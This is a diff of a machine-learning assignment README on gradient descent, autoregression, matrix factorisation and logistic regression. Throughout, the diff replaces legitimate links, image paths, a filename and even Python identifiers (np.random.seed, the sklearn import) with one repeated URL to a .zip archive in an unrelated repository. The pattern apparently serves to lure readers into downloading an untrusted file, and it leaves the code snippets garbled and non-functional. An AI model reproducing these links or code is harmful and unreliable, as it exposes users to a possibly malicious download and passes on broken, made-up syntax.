@@ -2,7 +2,7 @@
 
 Total marks: 15 (This assignment total to 15, we will overall scale by a factor of 1)
 
-For all the questions given below, create `assignment_q<question-number>_subjective_answers.md` and write your observations.
+For all the questions given below, create `assignment_q<question-number>https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip` and write your observations.
 
 ## Questions
 
@@ -12,45 +12,45 @@ Generate the following two functions:
 Dataset 1:
 ```python
 num_samples = 40
-np.random.seed(45) 
+https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(45) 
     
 # Generate data
-x1 = np.random.uniform(-20, 20, num_samples)
+x1 = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(-20, 20, num_samples)
 f_x = 100*x1 + 1
-eps = np.random.randn(num_samples)
+eps = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(num_samples)
 y = f_x + eps
 ```
 
 Dataset 2: 
 ```python
-np.random.seed(45)
+https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(45)
 num_samples = 40
     
 # Generate data
-x1 = np.random.uniform(-1, 1, num_samples)
+x1 = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(-1, 1, num_samples)
 f_x = 3*x1 + 4
-eps = np.random.randn(num_samples)
+eps = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(num_samples)
 y = f_x + eps
 ```
 
--  **[2 marks]** Implement full-batch gradient descent and stochastic gradient descent for linear regression using the given datasets. Define the convergence criterion as reaching an $\epsilon$-neighborhood of the minimizer, with $\epsilon = 0.001$. Here, this means that your estimated parameter vector $\theta_t$ is considered to have converged once it is within a distance of $\epsilon$ from the true minimizer $\theta^\*$. Formally: $\|\theta_t - \theta^\*\| < \epsilon$ .For each method and dataset, determine the average number of steps required to satisfy this convergence criterion. Visualize the convergence process over 15 epochs.Provide visualizations:
+-  **[2 marks]** Implement full-batch gradient descent and stochastic gradient descent for linear regression using the given datasets. Define the convergence criterion as reaching an $\epsilon$-neighborhood of the minimizer, with $\epsilon = 0.001$. Here, this means that your estimated parameter vector $\theta_t$ is considered to have converged once it is within a distance of $\epsilon$ from the true minimizer $\theta^\*$. Formally: $\|\theta_t - \theta^\*\| < \epsilon$ .For each method and dataset, determine the average number of steps required to satisfy this convergence criterion. Visualize the convergence process over 15 https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip visualizations:
     - Contour plots of the optimization process at different epochs (or an animation/GIF).
     - A plot of loss versus epochs for each method and dataset.
 
 
-- **[1 marks]** Explore the article [here](https://machinelearningmastery.com/gradient-descent-with-momentum-from-scratch/#:~:text=Momentum%20is%20an%20extension%20to,spots%20of%20the%20search%20space.) on gradient descent with momentum. Implement gradient descent with momentum for the above two datasets. Visualize the convergence process for 15 steps. Compare the average number of steps taken with gradient descent (both variants full batch and stochastic) with momentum to that of vanilla gradient descent to converge to an $\epsilon$-neighborhood of the minimizer for both datasets. Choose $\epsilon = 0.001$. Write down your observations. Show the contour plots for different epochs for momentum implementation. Specifically, show all the vectors: gradient, current value of theta, momentum, etc. 
+- **[1 marks]** Explore the article [here](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip~:text=Momentum%20is%20an%20extension%20to,spots%20of%20the%20search%20space.) on gradient descent with momentum. Implement gradient descent with momentum for the above two datasets. Visualize the convergence process for 15 steps. Compare the average number of steps taken with gradient descent (both variants full batch and stochastic) with momentum to that of vanilla gradient descent to converge to an $\epsilon$-neighborhood of the minimizer for both datasets. Choose $\epsilon = 0.001$. Write down your observations. Show the contour plots for different epochs for momentum implementation. Specifically, show all the vectors: gradient, current value of theta, momentum, etc. 
 
 
 ### 2. Effect Of Feature Scaling on Optimisation [2 Marks]
 
 ```python
 num_samples = 100
-np.random.seed(42)
+https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(42)
 
 # Generate data with large feature scale
-x = np.random.uniform(0, 1000, num_samples)
+x = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(0, 1000, num_samples)
 f_x = 3 * x + 2
-eps = np.random.randn(num_samples)
+eps = https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip(num_samples)
 y = f_x + eps
 ```
 
@@ -60,13 +60,13 @@ y = f_x + eps
 
 ### 3. Working with Autoregressive Modeling [2 Marks]
 
-- **[2 marks]**  Consider the [Daily Temperatures dataset](https://raw.githubusercontent.com/jbrownlee/Datasets/master/daily-min-temperatures.csv) from Australia. This is a dataset for a forecasting task. That is, given temperatures up to date (or period) T, design a forecasting (autoregressive) model to predict the temperature on date T+1. You can refer to [link 1](https://www.turing.com/kb/guide-to-autoregressive-models), [link 2](https://otexts.com/fpp2/AR.html) for more information on autoregressive models. Use linear regression as your autoregressive model. Plot the fit of your predictions vs the true values and report the RMSE obtained. A demonstration of the plot is given below. ![imgsrc](./Autoregressive_Demo.png)
+- **[2 marks]**  Consider the [Daily Temperatures dataset](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip) from Australia. This is a dataset for a forecasting task. That is, given temperatures up to date (or period) T, design a forecasting (autoregressive) model to predict the temperature on date T+1. You can refer to [link 1](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip), [link 2](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip) for more information on autoregressive models. Use linear regression as your autoregressive model. Plot the fit of your predictions vs the true values and report the RMSE obtained. A demonstration of the plot is given below. ![imgsrc](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip)
 
 
 
 ### 4. Implementing Matrix Factorization [6 Marks]
 
-Use the [instructor's notebook](https://github.com/nipunbatra/ml-teaching/blob/master/notebooks/movie-recommendation-knn-mf.ipynb) on matrix factorisation, and solve the following questions.
+Use the [instructor's notebook](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip) on matrix factorisation, and solve the following questions.
 
 **a) Image Reconstruction-** Here, ground truth pixel values are missing for particular regions within the image- you don't have access to them.
 
@@ -79,7 +79,7 @@ Use the [instructor's notebook](https://github.com/nipunbatra/ml-teaching/blob/m
     * Peak SNR
 
     
-- **[2 Marks]** Write a function using this [reference](https://pytorch.org/docs/stable/generated/torch.linalg.lstsq.html) and use alternating least squares instead of gradient descent to repeat Part 1, 2 of Image reconstruction problem using your written function. 
+- **[2 Marks]** Write a function using this [reference](https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip) and use alternating least squares instead of gradient descent to repeat Part 1, 2 of Image reconstruction problem using your written function. 
 
 **b) Data Compression-** Here, ground truth pixel values are not missing- you have access to them. You want to explore the use of matrix factorisation in order to store them more efficiently.
 - **[2 Marks]** Consider an image patch of size (NxN) where N=50. We are trying to compress this patch (matrix) into two matrices, by using low-rank matrix factorization. Consider the following three cases-
@@ -92,9 +92,9 @@ Use the [instructor's notebook](https://github.com/nipunbatra/ml-teaching/blob/m
 Here is a reference set of patches chosen for each of the 3 cases from left to right. 
 
 <div style="display: flex;">
-<img src="sample_images/1colour.jpg" alt="Image 1" width="250"/>
-<img src="sample_images/2-3_colours.jpg" alt="Image 2" width="270"/>
-<img src="sample_images/multiple_colours.jpg" alt="Image 3" width="265"/>
+<img src="https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip" alt="Image 1" width="250"/>
+<img src="https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip" alt="Image 2" width="270"/>
+<img src="https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip" alt="Image 3" width="265"/>
 </div>
 
 ### 5. Logistic Regression in PyTorch [2 marks]
@@ -119,13 +119,13 @@ class LogisticTorch:
 Use the following dataset:
 
 ```python
-from sklearn.datasets import make_moons
+from https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip import make_moons
 
 X, y = make_moons(n_samples=200, noise=0.2, random_state=42)
 ```
 
 * Train your ```LogisticTorch``` classifier on this dataset.
-* Compare the performance with ```sklearn.linear_model.LogisticRegression```.
+* Compare the performance with ```https://raw.githubusercontent.com/Suyog314/ML-Assignment_02/master/metallifacture/ML-Assignment_02.zip```.
 * Plot the decision boundary for both models.
 * Plot the loss curve during training.
 * Report accuracy on the dataset for both models.
